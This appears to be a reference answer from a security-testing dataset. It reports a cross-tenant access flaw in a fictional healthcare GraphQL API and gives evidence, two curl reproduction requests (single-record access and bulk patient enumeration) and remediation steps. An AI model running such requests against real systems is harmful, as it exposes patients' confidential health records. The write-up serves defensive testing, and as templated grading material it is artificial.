# Expected Response

## System
- Domain: Healthcare / EHR
- System: PatientCore EHR API
- Example ID: GQL-0101

## Priority Findings

### Finding 1: EHR Patient Record Access via Semantically Ambiguous Over-Broad Endpoint (Pattern 3.3)
**Severity:** Critical
**Category:** Insecure Design / Semantic Ambiguity / PHI Exposure

**Summary:**
Per §5.0 (Pattern 3.3 — semantic ambiguity/over-broad endpoints): The `getPatient` query is semantically over-broad — it returns any patient record by ID with no ownership boundary. An attacker from `tenant-eaeb` accessed Electronic Health Record `P-2101` belonging to `tenant-9964`. The endpoint name implies the caller's own patient context, but the implementation has no ownership enforcement. This constitutes a HIPAA PHI breach — unauthorized access to patient diagnoses, treatment history, medications, and clinician notes.

**Evidence from HAR:**
- Request: `POST https://api.patientcore-ehr-ap.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-eaeb`
- Query: `getPatient(id: "P-2101") { patientId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `getPatient`: `tenantId: "tenant-9964"`, `ownerId: "other-user-eaeb9964"`, `sensitiveField: "CONFIDENTIAL-eaeb9964"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-eaeb9964`
- Note: Domain object is `Patient`/`patientId` — resolver is `getPatient`.

## Steps to Reproduce

### Step 1 — Cross-tenant EHR patient record access (HAR)
```bash
curl -s -X POST https://api.patientcore-ehr-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-eaeb" \
  -d '{"query": "query VulnerableOp { getPatient(id: \"P-2101\") { patientId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** PHI from `tenant-9964` returned. **Secure:** FORBIDDEN.

### Step 2 — Enumerate patients via bulk lookup
```bash
curl -s -X POST https://api.patientcore-ehr-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-eaeb" \
  -d '{"query": "mutation { bulkPatientLookup(ids: [\"P-2101\", \"P-1101\", \"P-3101\"]) { patientId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Bulk PHI exposure.

## Remediation
1. `getPatient` resolver: `WHERE patient_id=$id AND tenant_id=$jwt.tenantId`.
2. Per-ID ownership filter in `bulkPatientLookup`.
3. Return HTTP 404 for non-owned patient IDs — never confirm existence.
4. Redis cache key: `patient:{tenantId}:{patientId}`.
